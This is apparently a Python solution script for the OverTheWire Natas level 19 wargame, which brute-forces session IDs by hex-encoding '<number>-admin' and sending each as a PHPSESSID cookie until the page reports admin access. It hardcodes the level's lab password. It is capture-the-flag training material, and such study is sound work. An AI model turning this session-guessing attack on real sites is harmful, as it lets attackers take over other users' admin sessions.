#!/usr/bin/env python3
import requests

url = 'http://natas19.natas.labs.overthewire.org'
s = requests.Session()
s.auth = ('natas19', '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
data = {'username':'admin', 'password':'fjakf'}

def bin2hex(number):
    h = f'{number}-admin'
    if not isinstance(h, str):return None
    r = ''
    for var in h:
        r += hex(ord(var))[2:]
    return r

for var in range(1, 641):
    print(f"Find position {var}")
    req = s.post(url, data = data, cookies = {'PHPSESSID':bin2hex(var)})
    if 'You are an admin' in req.text:
        print(req.text)
        break
